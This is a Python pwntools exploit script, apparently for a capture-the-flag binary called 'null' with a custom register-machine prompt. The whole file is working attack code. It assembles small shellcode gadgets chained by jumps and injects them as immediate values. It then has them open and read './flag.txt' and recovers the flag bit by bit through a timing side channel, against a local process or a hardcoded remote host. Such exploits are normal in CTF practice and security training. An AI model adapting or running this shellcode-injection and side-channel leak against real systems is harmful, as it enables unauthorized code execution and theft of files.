#!/usr/bin/env python3
# Local Ubuntu 24.04

from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./null"
elf  = ELF(BINARY, checksec=False)

flag = ""

def Conn():
  if len(sys.argv) > 1 and sys.argv[1] == 'r':
    HOST = "83.136.248.27"
    PORT = 45327
    s = remote(HOST, PORT)
  else:
    s = process(BINARY)
  return s

buf1 = asm("""
    push rdi
    pop rbx
    pos:
    jmp pos+3
""")

buf2 = asm("""
    int 0x80
    pos:
    jmp pos+3
""")

buf3 = asm("""
    push rdi
    pop rsi
    pos:
    jmp pos+3
""")

buf4 = asm("""
    push rax
    pop rdi
    pos:
    jmp pos+3
""")

buf5 = asm("""
    mov dl, 0x60
    pos:
    jmp pos+3
""")

buf6 = asm("""
    mov al, 0
    pos:
    jmp pos+3
""")

buf7 = asm("""
    syscall
    pos:
    jmp pos+3
""")

buf8 = asm("""
    push rsi
    pop rax
    pos:
    jmp pos+3
""")

buf9 = asm("""
    push rax
    pop rsi
    pos:
    jmp pos+3
""")

buf10 = asm("""
    mov al, byte ptr [rsi]
    pos:
    jmp pos+3
""")

buf11 = asm(f"""
    cmp al, 0
    pos:
    jmp pos+3
""")

buf12 = asm("""
    pos:
    jnz pos
    nop
    nop
""")

for byte_i in range(74, 0x60):
  bits = ""
  for bit_i in range(8):
    s = Conn()

    s.sendlineafter(b"Null> ", b"add h1 h1") 
    s.sendlineafter(b"Null> ", b"add h1 h1")

    for i in range(0x2e):  
      s.sendlineafter(b"Null> ", b"mov h1 1") 
    s.sendlineafter(b"Null> ", b"mov h0 5")  # sys open

    s.sendlineafter(b"Null> ", b"mov h1 " + str(u32(buf1)).encode())
    s.sendlineafter(b"Null> ", b"mov h1 " + str(u32(buf2)).encode())
    s.sendlineafter(b"Null> ", b"mov h1 " + str(u32(buf3)).encode())
    s.sendlineafter(b"Null> ", b"mov h1 " + str(u32(buf4)).encode())
    s.sendlineafter(b"Null> ", b"mov h1 " + str(u32(buf5)).encode())
    s.sendlineafter(b"Null> ", b"mov h1 " + str(u32(buf6)).encode())
    s.sendlineafter(b"Null> ", b"mov h1 " + str(u32(buf7)).encode())
    s.sendlineafter(b"Null> ", b"mov h1 " + str(u32(buf8)).encode())

    buf = asm(f"""
    add al, {byte_i} 
    pos:
    jmp pos+3
    """)
    s.sendlineafter(b"Null> ", b"mov h1 " + str(u32(buf)).encode())
    s.sendlineafter(b"Null> ", b"mov h1 " + str(u32(buf9)).encode())
    s.sendlineafter(b"Null> ", b"mov h1 " + str(u32(buf10)).encode())

    buf = asm(f"""
    and al, {1 << bit_i}
    pos:
    jmp pos+3
    """)
    s.sendlineafter(b"Null> ", b"mov h1 " + str(u32(buf)).encode())
    s.sendlineafter(b"Null> ", b"mov h1 " + str(u32(buf11)).encode())
    s.sendlineafter(b"Null> ", b"mov h1 " + str(u32(buf12)).encode())

    s.sendlineafter(b"Null> ", b"mov h2 " + str(ord(".")).encode())
    s.sendlineafter(b"Null> ", b"str h2 0")
    s.sendlineafter(b"Null> ", b"mov h2 " + str(ord("/")).encode())
    s.sendlineafter(b"Null> ", b"str h2 1")
    s.sendlineafter(b"Null> ", b"mov h2 " + str(ord("f")).encode())
    s.sendlineafter(b"Null> ", b"str h2 2")
    s.sendlineafter(b"Null> ", b"mov h2 " + str(ord("l")).encode())
    s.sendlineafter(b"Null> ", b"str h2 3")
    s.sendlineafter(b"Null> ", b"mov h2 " + str(ord("a")).encode())
    s.sendlineafter(b"Null> ", b"str h2 4")
    s.sendlineafter(b"Null> ", b"mov h2 " + str(ord("g")).encode())
    s.sendlineafter(b"Null> ", b"str h2 5")
    s.sendlineafter(b"Null> ", b"mov h2 " + str(ord(".")).encode())
    s.sendlineafter(b"Null> ", b"str h2 6")
    s.sendlineafter(b"Null> ", b"mov h2 " + str(ord("t")).encode())
    s.sendlineafter(b"Null> ", b"str h2 7")
    s.sendlineafter(b"Null> ", b"mov h2 " + str(ord("x")).encode())
    s.sendlineafter(b"Null> ", b"str h2 8")
    s.sendlineafter(b"Null> ", b"mov h2 " + str(ord("t")).encode())
    s.sendlineafter(b"Null> ", b"str h2 9")

    s.sendlineafter(b"Null> ", b"A"*0x20 + b":") 
    s.sendlineafter(b"Null> ", b"jmp " + b"A"*0x20)
    s.sendlineafter(b"Null> ", b"ret")
    
    s_time = time.time()
    s.recvrepeat(2)
    e_time = time.time() - s_time
    print(e_time)
    if e_time > 2:
      bits += "1"
    else:
      bits += "0"
    print(bits)
    s.close()
 
  print(hex(int(bits[::-1], 2)))
  flag += chr(int(bits[::-1], 2))
  print("flag =", flag)

s.interactive() 
